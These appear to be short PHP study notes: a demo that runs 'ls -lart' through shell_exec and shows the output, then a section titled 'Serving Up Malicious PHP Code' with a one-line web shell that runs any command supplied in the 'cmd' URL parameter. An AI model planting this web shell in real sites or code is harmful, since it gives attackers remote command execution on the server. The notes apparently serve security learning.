## Basic PHP Read-Eval-Print-Loop
```bash
vim demo.php
```
```php
<?php
  $output = shell_exec('ls -lart');
  echo "<pre>$output</pre>";
?>
```
```bash
php demo.php # <pre> tags become necessary when the code is executed by a web server and rendered by browser

# output
<pre>total 48
drwxr-xr-x   8 root    admin   256 Apr 24 20:56 ..
drwxr-xr-x+  4 Victor  staff   128 Apr 24 20:56 Public
drwx------+  3 Victor  staff    96 Apr 24 20:56 Documents
drwx------+  3 Victor  staff    96 Apr 24 20:56 Desktop
drwx------+  4 Victor  staff   128 Apr 24 20:58 Movies
drwx------+  4 Victor  staff   128 Apr 24 21:00 Pictures
drwx------+  4 Victor  staff   128 Apr 24 21:05 Music
drwx------+  5 Victor  staff   160 Apr 24 21:10 Downloads
drwx------@ 60 Victor  staff  1920 Apr 24 22:21 Library
-rw-r--r--   1 Victor  staff    74 Apr 26 15:17 demo.php
drwxr-xr-x+ 15 Victor  staff   480 Apr 26 15:17 .
</pre>
```
## Serving Up Malicious PHP Code
```bash
<?php 
  echo shell_exec($_GET['cmd']); 
?>
```
